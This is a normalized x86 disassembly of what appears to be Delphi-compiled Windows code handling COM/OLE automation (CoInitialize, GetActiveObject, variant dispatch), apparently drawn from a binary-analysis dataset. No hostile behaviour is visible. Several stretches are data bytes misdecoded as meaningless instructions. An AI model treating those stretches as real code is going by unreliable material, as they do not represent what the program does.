mov eax [ ebp + 0x14 ]
push eax
push esi
lea ecx [ ebp - 0x104 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_456598
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax esi
call sub_40e978
sub_456aa4
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov [ ebp - 0x4 ] ecx
mov ebx edx
xor edx edx
push ebp
push j_sub_4038a0#8
push [ fs : edx ]
mov [ fs : edx ] esp
cmp eax 0x80020009
jne r-xdata
push eax
push 0x0
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_455ea8
mov esi eax
mov eax [ ebx + 0x1c ]
push eax
lea eax [ ebp - 0x8 ]
mov edx [ ebx + 0x4 ]
call sub_404124
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0xc ]
mov edx [ ebx + 0xc ]
call sub_404124
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebx + 0x10 ]
push eax
lea eax [ ebp - 0x10 ]
mov edx [ ebx + 0x8 ]
call sub_404124
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_455f78
mov esi eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax esi
call sub_4038d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_456b70
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_403ec0
retn
push [ ebp - 0x4 ]
mov eax esi
jmp sub_4038d8
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_404a04
jmp r-xdata
sub_456b94
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
mov ebx [ ebp + 0xc ]
xor edx edx
mov edi esp
movzx ecx [ ebx + 0x1 ]
mov [ ebp - 0x8 ] ecx
test ecx ecx
je r-xdata
mov [ ebp - 0x10 ] esp
movzx eax [ ebx + 0x2 ]
mov [ ebp - 0x4 ] eax
test eax eax
je r-xdata
add ebx 0x3
mov esi [ ebp + 0x18 ]
movzx ecx [ ebx ]
cmp ecx 0x4
jne r-xdata
mov esi [ ebp + 0x14 ]
and al 0x7f
or eax 0x4000
cmp al 0xc
je r-xdata
mov [ ebp - 0xc ] esp
push edx
lea eax [ ebp - 0x30 ]
push eax
push ecx
push edx
call sub_456b84
pop edx
pop ecx
push [ ebp + 0x1c ]
lea eax [ ebp - 0x10 ]
push eax
push ecx
push edx
push rw-data
push [ ebp + 0x10 ]
mov eax [ ebp + 0x8 ]
push eax
mov eax [ eax ]
call [ eax + 0x18 ]
test eax eax
je r-xdata
push 0xfffffffd
inc [ ebp - 0x4 ]
cmp [ ebx + 0x3 ] 0x9
je r-xdata
push [ esi + eax * 4 - 0x4 ]
dec eax
jne r-xdata
movzx eax [ ebx ]
test al 0x80
jne r-xdata
mov ebx [ ebp + 0xc ]
push [ esi + 0xc ]
push [ esi + 0x8 ]
push [ esi + 0x4 ]
push [ esi ]
add esi 0x10
jmp r-xdata
cmp al 0x5
jb r-xdata
mov esp edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
lea edx [ ebp - 0x30 ]
mov cl 0x1
push ecx
mov ecx [ ebp + 0x4 ]
jmp sub_456aa4
mov ecx 0x8
cmp [ ebx + 0x3 ] 0xd
jne r-xdata
inc ebx
dec ecx
jne r-xdata
push edx
push [ esi ]
push edx
push eax
add esi 0x4
cmp al 0x7
ja r-xdata
push [ esi + 0x4 ]
push [ esi ]
push edx
push eax
add esi 0x8
jmp r-xdata
sub_456c78
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x10 ]
xor eax eax
push eax
push eax
push eax
push eax
mov eax esp
push eax
lea eax [ ebp + 0x14 ]
push eax
push eax
push [ ebx ]
lea eax [ ebx + 0x5 ]
push eax
push [ ebp + 0xc ]
call sub_456b94
movzx eax [ ebx + 0x4 ]
mov ebx [ ebp + 0x8 ]
jmp [ eax * 4 + jump_table_456ca9 ]
fld [ esp + 0x8 ]
jmp r-xdata
fld [ esp + 0x8 ]
jmp r-xdata
fild [ esp + 0x8 ]
jmp r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
mov eax ebx
call sub_40e978
mov eax [ esp ]
mov [ ebx ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x4 ] eax
mov eax [ esp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ esp + 0xc ]
mov [ ebx + 0xc ] eax
jmp r-xdata
mov eax [ esp + 0x8 ]
add esp 0x10
pop ebx
pop ebp
retn
mov eax [ esp + 0x8 ]
mov [ ebx ] eax
jmp r-xdata
push eax
call SysFreeString
mov eax [ esp + 0x8 ]
mov [ ebx ] eax
jmp r-xdata
push eax
mov eax [ eax ]
call [ eax + 0x8 ]
sub_456d54
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0xffffffff
je r-xdata
call [ rw-data ]
push 0x0
call CoInitialize
call sub_41402c
mov [ rw-data ] al
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
push 0x0
call [ rw-data ]
call sub_41402c
mov [ rw-data ] al
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
mov al 0x1
test [ rw-data ] 0x2
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov edx [ rw-data ]
mov [ edx ] al
retn
sub_456dcc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_456e42
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_456e49
retn
mov [ rw-data ] 0x1
mov eax [ rw-data ]
call sub_403164
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
cmp [ rw-data ] 0x0
je r-xdata
mov eax rw-data
mov ecx 0x5
mov edx [ r-xdata ]
call sub_404918
call CoUninitialize
sub_456e4c
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_456394
mov eax sub_456a08
mov edx [ rw-data ]
mov [ edx ] eax
mov eax [ rw-data ]
mov [ eax ] sub_456c78
mov eax r-xdata
mov edx [ rw-data ]
mov [ edx ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ eax ] sub_456d54
sub_456ea4
push 0xc004616
inc [ eax ]
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_456ed1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_456ed8
retn
sub_456ee8
adc [ 0x72615654 ] ecx
imul esp [ ecx + 0x6e ] 0x72724174
popad
jns r-xdata
dec edi
insb
push ebx
jb r-xdata
add [ eax ] al
add al bl
adc [ eax ] al
or al 0x0
add [ eax ] al
fcom [ eax ]
inc eax
add [ ecx ] cl
jb r-xdata
jb r-xdata
add al al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
salc
outsd
inc ebp
add [ eax + eax ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ eax ] 0x0
add [ eax ] al
add [ eax ] al
inc esi
salc
outsd
inc ebp
add [ eax + eax ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax eax
jl r-xdata
jb r-xdata
add bl al
lea eax [ eax ]
inc eax
add [ eax ] bl
outsd
inc ebp
sub [ ebx - 0x4bfbdbbc ] al
jmp sub_457790
inc ebp
add dl dh
outsd
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + esi * 2 + 0x45 ] bh
add [ eax ] dl
add [ eax ] al
add al ch
adc [ eax ] al
xchg esp eax
xor eax [ eax ]
mov al [ 0xffffffffa4004033 ]
xor eax [ eax ]
test al 0x33
inc eax
add [ ebx + esi + 0x30fc0040 ] bl
inc eax
add [ eax ] bl
xor [ eax ] eax
push esp
xor [ eax ] eax
adc al 0x54
push ebx
jb r-xdata
add [ ebx ] al
or al 0x54
inc ebx
outsd
outsb
outsb
arpl [ gs : ebx + ecx * 2 + 0x69 ] si
outsb
add [ fs : eax ] eax
add [ eax ] al
add [ eax + eax ] al
add [ eax ] al
adc al 0x6f
inc ebp
add [ esi ] cl
arpl [ ebx + 0x52 ] bp
jne r-xdata
inc eax
add ah cl
add [ esp + 0x4 ] 0xfffffff4
jge r-xdata
outsb
imul ebp [ esi + 0x67 ] 0x654e724f
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xchg [ ecx + 0x45 ] dh
add [ eax ] dl
add [ eax ] al
in al 0x53
jb r-xdata
inc esp
and al 0x4
hlt
add [ eax ] al
add [ esp + 0x4 ] 0xfffffff4
jmp r-xdata
adc [ ebx + 0x6b ] esp
push edx
arpl [ ebx + 0x4e ] bp
ja r-xdata
add [ eax ] al
add [ eax ] al
jbe r-xdata
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor eax eax
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push j_sub_4038a0#7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x1c ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_4050a4
add esp 0x4
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_404ef0
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x0
jle r-xdata
jmp r-xdata
outsb
imul ebp [ esi + 0x67 ] 0x74736e49
popad
outsb
arpl [ ebp + 0x8 ] sp
arpl [ ebx + 0x52 ] bp
insd
outsd
je r-xdata
jmp sub_457304
outsb
jae r-xdata
add [ eax ] al
add [ eax ] al
je r-xdata
outsb
je r-xdata
mov ebx [ ebp - 0xc ]
mov edi [ ebp - 0x10 ]
sub edi ebx
jl r-xdata
mov ebx [ ebp - 0xc ]
mov edi [ ebp - 0x10 ]
sub edi ebx
jl r-xdata
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
add eax [ eax ]
add ah cl
int3
adc esp [ ebx + 0x6b ]
inc ecx
je r-xdata
inc esp
and al 0x4
hlt
jne r-xdata
popad
outsb
arpl [ ebp + 0x11 ] sp
arpl [ ebx + 0x52 ] bp
add [ eax - 0x53ffba8b ] dh
jne r-xdata
inc ecx
add [ eax ] ch
int3
inc ebp
add [ eax + 0x4571 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x50004571 ] al
add [ eax ] al
add ah ah
push ebx
add al al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
mov bh 0x70
inc ebp
add [ eax + eax ] cl
add [ eax ] al
add [ eax ] al
add [ eax + r-xdata ] dl
retn
imul esi [ ebx + 0x70 ] 0x68637461
lea eax [ eax ]
int3
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
inc edi
inc edi
inc [ ebx + 0x8 ]
mov eax [ ebx + 0x8 ]
pop ebx
pop ebp
retn 0x4
push eax
call sub_457790
add [ edi - 0x5effba91 ] dl
outsd
inc ebp
add [ ebx + 0x200456f ] ch
popad
arpl [ eax + 0x54 ] bp
outsd
dec ecx
outsb
je r-xdata
insb
add [ eax - 0x5fffbfd7 ] ah
sub [ eax ] eax
push cs
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x0
jle r-xdata
lea ecx [ ebp - 0x4 ]
mov edx [ ebp + 0xc ]
mov ebx [ eax ]
call [ ebx + 0x38 ]
mov eax ebx
add eax eax
mov edx [ ebp - 0x8 ]
mov edx [ edx ]
lea esi [ edx + eax * 8 ]
mov eax [ ebp - 0x10 ]
sub eax ebx
add eax eax
mov edx [ ebp - 0x4 ]
lea eax [ edx + eax * 8 ]
mov edx esi
call sub_40eca0
inc ebx
dec edi
jne r-xdata
mov eax ebx
add eax eax
mov edx [ ebp - 0x8 ]
mov edx [ edx ]
lea esi [ edx + eax * 8 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + ebx * 4 ]
add eax eax
mov edx [ ebp - 0x4 ]
lea eax [ edx + eax * 8 ]
mov edx esi
call sub_40eca0
inc ebx
dec edi
jne r-xdata
jmp r-xdata
add [ eax ] al
add [ eax ] al
add al 0x2
add [ eax ] al
add [ eax ] al
outsd
inc ebp
add [ ebp - 0x68ffba91 ] cl
outsd
inc ebp
add [ ecx - 0x54ffba91 ] ah
outsd
inc ebp
add [ edx ] al
jb r-xdata
outsb
dec esi
popad
insd
mov eax eax
jb r-xdata
mov esp 0x44004010
jb r-xdata
mov ebx [ ebp - 0xc ]
mov edi [ ebp - 0x10 ]
sub edi ebx
jl r-xdata
mov ebx [ ebp - 0xc ]
mov edi [ ebp - 0x10 ]
sub edi ebx
jl r-xdata
lea ebp [ edi + 0x45 ]
popad
arpl [ ebp + 0x9 ] sp
dec edi
insb
push ebx
jb r-xdata
inc eax
add [ edi + esi * 2 + 0x45 ] cl
add [ eax ] al
adc [ eax ] al
dec esp
ja r-xdata
push esi
call IsEqualGUID
test al al
je r-xdata
dec ebp
popad
arpl [ eax + 0x69 ] bp
add [ ebx + esi + 0x30fc0040 ] bl
inc eax
add [ eax ] bl
xor [ eax ] eax
cmp [ ebp + 0x45 ] dh
add [ eax + 0x30004171 ] ah
enter 0x41 0xbc
jo r-xdata
inc eax
add [ eax + 0x7004571 ] bl
or dl [ edi + ecx * 2 + 0x6c ]
push ebx
jb r-xdata
push 0x0
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_4050a4
add esp 0x4
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4574c9
inc edi
inc edi
je r-xdata
outsd
inc ebx
outsd
outsb
outsb
arpl [ gs : esp + edx + 0x6f ] si
inc ebp
add [ edi + esi * 2 ] dh
inc ebp
add [ eax + 0x77 ] cl
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0003 ] al
outsd
add [ eax ] al
inc [ eax + eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x52110004 ] al
insd
mov esp 0x44004010
add [ edi + esi * 2 + 0x45 ] ah
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x410b0002 ] al
mov eax 0x80004002
mov ecx edi
mov edx sub_4572b4
mov eax ebx
call sub_403218
xor eax eax
jmp r-xdata
push ebx
jb r-xdata
add [ eax ] al
mov esp 0x44004010
add [ eax ] al
add [ edx ] cl
push esp
dec edi
insb
add [ eax - 0x2bffba8b ] cl
mov [ ecx ] sub_41c918
adc dl cl
inc ecx
add [ eax - 0x34 ] al
inc ecx
add [ eax ] ch
leave
inc ecx
add [ eax ] ah
leave
inc ecx
add [ eax + 0x77 ] ch
inc ebp
add ah ah
je r-xdata
outsd
je r-xdata
add [ eax - 0x80000000 ] al
add al 0x0
adc [ edx + 0x65 ] edx
insd
jb r-xdata
inc ebx
dec edi
jne r-xdata
mov eax esi
mov edx [ ebp - 0x10 ]
sub edx ebx
add edx edx
mov ecx [ ebp - 0x4 ]
lea edx [ ecx + edx * 8 ]
call sub_40eca0
inc ebx
dec edi
jne r-xdata
mov eax esi
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x4 ]
mov edx [ edx + ebx * 4 ]
add edx edx
mov ecx [ ebp - 0x4 ]
lea edx [ ecx + edx * 8 ]
call sub_40eca0
retn
call sub_4034c8
pop [ fs : 0x0 ]
add esp 0xc
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
push ebx
jb r-xdata
xor [ ecx + 0x45 ] dh
add [ eax - 0x4fffbfd7 ] ah
jne r-xdata
jne r-xdata
inc ecx
jno r-xdata
mov eax ebx
add eax eax
mov edx [ ebp - 0x8 ]
mov edx [ edx ]
lea esi [ edx + eax * 8 ]
mov ax [ esi ]
and ax 0x4000
cmp ax 0x4000
jne r-xdata
mov eax ebx
add eax eax
mov edx [ ebp - 0x8 ]
mov edx [ edx ]
lea esi [ edx + eax * 8 ]
mov ax [ esi ]
and ax 0x4000
cmp ax 0x4000
jne r-xdata
jmp r-xdata
add eax 0x6c4f0900
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + r-xdata ] bh
add [ eax ] al
or dl [ edi + ecx * 2 + 0x6c ]
add [ ebp + esi * 2 + 0x29a00045 ] ch
inc eax
add [ eax + 0xe004029 ] ah
outsb
outsb
arpl [ gs : ebx + ecx * 2 + 0x69 ] si
outsb
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add eax [ eax ]
or eax [ ebx + 0x6f ]
add al ah
push esp
inc ecx
add [ 0x6c4f0900 ] al
sub_456fbf
add [ esp + 0x4 ] 0xfffffff4
jmp r-xdata
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
inc [ ebx + 0x8 ]
mov eax [ ebx + 0x8 ]
pop ebx
pop ebp
retn 0x4
push eax
call sub_457790
sub_4570eb
add [ eax ] al
add [ eax ] al
add [ ecx + esi * 2 + 0x45 ] dh
add [ eax + 0x4571 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x50004571 ] al
add [ eax ] al
add ah ah
push ebx
inc ecx
add [ eax ] ch
int3
sub_457260
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
mov ecx edi
mov edx esi
mov eax ebx
call sub_403218
test al al
je r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x30 ]
add eax 0x20
push eax
push esi
call IsEqualGUID
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax 0x80004002
mov ecx edi
mov edx sub_4572b4
mov eax ebx
call sub_403218
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_4572b4
add [ edx + eax ] al
add [ eax ] al
add [ eax ] al
add al al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
inc [ ebx + 0x8 ]
mov eax [ ebx + 0x8 ]
pop ebx
pop ebp
retn 0x4
push eax
call sub_457790
sub_4572e4
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
dec [ ebx + 0x8 ]
mov eax [ ebx + 0x8 ]
pop ebx
pop ebp
retn 0x4
push eax
call sub_4577a0
sub_4574e4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41c4b8
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
mov eax [ esi + 0x30 ]
inc [ eax + 0x38 ]
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_457234
mov [ esi + 0x38 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403470
mov eax esi
pop esi
pop ebx
retn
call sub_4034c8
pop [ fs : 0x0 ]
add esp 0xc
sub_457538
push ebx
push esi
call sub_4034d8
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x40 ]
mov eax [ esi + 0x38 ]
call sub_4574d4
mov eax [ esi + 0x38 ]
push eax
call sub_4572e4
test eax eax
jne r-xdata
mov eax [ esi + 0x30 ]
dec [ eax + 0x38 ]
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41c504
test bl bl
jle r-xdata
mov eax [ esi + 0x38 ]
call sub_403164
pop esi
pop ebx
retn
mov eax esi
call sub_4034c0
sub_457588
push ebx
mov ebx eax
mov eax ebx
call sub_41c908
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_45774c
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
sub_4575b0
push ebp
mov ebp esp
mov ecx 0x4
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push j_sub_4038a0#6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_457734
sub al 0x1
jb r-xdata
mov eax esi
call sub_40575c
push eax
push 0x0
mov eax [ ebx + 0x30 ]
push eax
call GetActiveObject
call sub_41402c
test al al
jne r-xdata
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_457701
lea eax [ ebp - 0x24 ]
call sub_40457c
lea eax [ ebp - 0x20 ]
mov edx 0x3
call sub_403ec0
lea eax [ ebp - 0x4 ]
call sub_403e9c
retn
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_45609c
jmp r-xdata
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_45609c
jmp r-xdata
dec al
je r-xdata
mov eax esi
call sub_40575c
push eax
push 0x0
mov eax [ ebx + 0x30 ]
push eax
call GetActiveObject
mov esi eax
mov eax esi
call sub_41402c
test al al
jne r-xdata
dec al
je r-xdata
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x18 ]
mov eax [ ebx + 0x30 ]
call sub_456070
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0xb
lea edx [ ebp - 0x1c ]
mov eax [ ebx + 0x30 ]
call sub_456044
mov eax [ ebp - 0x1c ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0x14 ]
push eax
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_405c20
mov eax [ ebp - 0x20 ]
mov ecx 0x1
pop edx
call sub_408b70
push esi
push 0x0
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_455ea8
call sub_4038d8
jmp r-xdata
lea eax [ ebp - 0x24 ]
mov edx [ ebx + 0x44 ]
call sub_4046c8
mov eax [ ebp - 0x24 ]
mov ecx esi
mov edx [ ebx + 0x30 ]
call sub_4560d4
jmp r-xdata
sub_457768
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_403218
test al al
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_4577b0
push ebp
mov ebp esp
xor eax eax
push ebp
push j_sub_4038a0#5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4577dc
retn
sub_4577fc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_457821
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_457828
retn
sub_457834
push ebp
mov ebp esp
xor eax eax
push ebp
push j_sub_4038a0#4
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_457860
retn
sub_45786c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_457891
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_457898
retn
sub_457ec4
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_457f20
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0xb8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_457f27
lea eax [ ebp - 0x4 ]
call sub_40575c
retn
lea edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_457708
lea eax [ ebx + 0xb8 ]
mov edx [ ebp - 0x4 ]
mov ecx r-xdata
call sub_4057a0
sub_457f2b
add dh dl
or [ edx ] al
add [ eax ] al
add [ eax ] al
add al al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
push ebx
mov ebx eax
cmp [ ebx + 0xb8 ] 0x0
je r-xdata
pop ebx
retn
mov edx [ ebx + 0xb8 ]
mov eax ebx
call sub_457724
lea eax [ ebx + 0xb8 ]
call sub_40575c
sub_457f64
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4574e4
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403470
mov eax esi
pop esi
pop ebx
retn
call sub_4034c8
pop [ fs : 0x0 ]
add esp 0xc
sub_457f9c
push ebx
push esi
call sub_4034d8
mov ebx edx
mov esi eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_457538
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034c0
sub_457fc4
push ebx
push esi
mov esi ecx
mov ebx eax
cmp edx 0x5fc
jg r-xdata
add edx 0xfffffa03
cmp edx 0x5
ja r-xdata
je r-xdata
pop esi
pop ebx
retn
jmp [ edx * 4 + jump_table_458033 ]
cmp [ ebx + 0x72 ] 0x0
je r-xdata
cmp edx 0x117
jg r-xdata
cmp [ ebx + 0x7a ] 0x0
je r-xdata
cmp [ ebx + 0x82 ] 0x0
je r-xdata
cmp [ ebx + 0x8a ] 0x0
je r-xdata
cmp [ ebx + 0x92 ] 0x0
je r-xdata
cmp [ ebx + 0x9a ] 0x0
je r-xdata
cmp [ ebx + 0xaa ] 0x0
je r-xdata
mov eax [ esi ]
add eax 0x10
call sub_40f330
push eax
mov eax [ esi ]
add eax 0x20
call sub_40f330
push eax
mov eax [ esi ]
add eax 0x30
call sub_40f330
push eax
mov eax [ esi ]
call sub_40f330
mov ecx eax
mov edx ebx
mov eax [ ebx + 0x74 ]
call [ ebx + 0x70 ]
jmp r-xdata
sub edx 0x130
je r-xdata
je r-xdata
mov eax [ esi ]
add eax 0x10
call sub_40f330
push eax
mov eax [ esi ]
add eax 0x20
call sub_40f330
push eax
mov eax [ esi ]
add eax 0x30
call sub_40f330
push eax
mov eax [ esi ]
call sub_40f330
mov ecx eax
mov edx ebx
mov eax [ ebx + 0x7c ]
call [ ebx + 0x78 ]
jmp r-xdata
mov eax [ esi ]
mov ecx [ eax + 0x8 ]
mov edx ebx
mov eax [ ebx + 0x84 ]
call [ ebx + 0x80 ]
jmp r-xdata
mov edx ebx
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
jmp r-xdata
mov edx ebx
mov eax [ ebx + 0x94 ]
call [ ebx + 0x90 ]
jmp r-xdata
mov eax [ esi ]
add eax 0x10
call sub_40f330
push eax
mov eax [ esi ]
add eax 0x20
call sub_40f330
push eax
mov eax [ esi ]
mov eax [ eax + 0x38 ]
push eax
mov eax [ esi ]
call sub_40f330
mov ecx eax
mov edx ebx
mov eax [ ebx + 0x9c ]
call [ ebx + 0x98 ]
jmp r-xdata
mov eax [ esi ]
add eax 0x10
call sub_40f330
push eax
mov eax [ esi ]
call sub_40f330
mov ecx eax
mov edx ebx
mov eax [ ebx + 0xac ]
call [ ebx + 0xa8 ]
jmp r-xdata
cmp [ ebx + 0x52 ] 0x0
je r-xdata
sub edx 0x4ca
je r-xdata
cmp [ ebx + 0xb2 ] 0x0
je r-xdata
sub edx 0xffffffff
je r-xdata
mov edx ebx
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
jmp r-xdata
cmp [ ebx + 0x5a ] 0x0
je r-xdata
dec edx
je r-xdata
mov edx ebx
mov eax [ ebx + 0xb4 ]
call [ ebx + 0xb0 ]
sub edx 0xec
je r-xdata
mov edx ebx
mov eax [ ebx + 0x5c ]
call [ ebx + 0x58 ]
jmp r-xdata
cmp [ ebx + 0x6a ] 0x0
je r-xdata
jmp r-xdata
cmp [ ebx + 0xa2 ] 0x0
je r-xdata
sub edx 0x15
je r-xdata
mov eax [ esi ]
add eax 0x10
call sub_40f330
push eax
mov eax [ esi ]
add eax 0x20
call sub_40f330
push eax
mov eax [ esi ]
add eax 0x30
call sub_40f330
push eax
mov eax [ esi ]
call sub_40f330
mov ecx eax
mov edx ebx
mov eax [ ebx + 0x6c ]
call [ ebx + 0x68 ]
jmp r-xdata
mov eax [ esi ]
add eax 0x10
call sub_40f330
push eax
mov eax [ esi ]
add eax 0x20
call sub_40f330
push eax
mov eax [ esi ]
call sub_40f330
mov ecx eax
mov edx ebx
mov eax [ ebx + 0xa4 ]
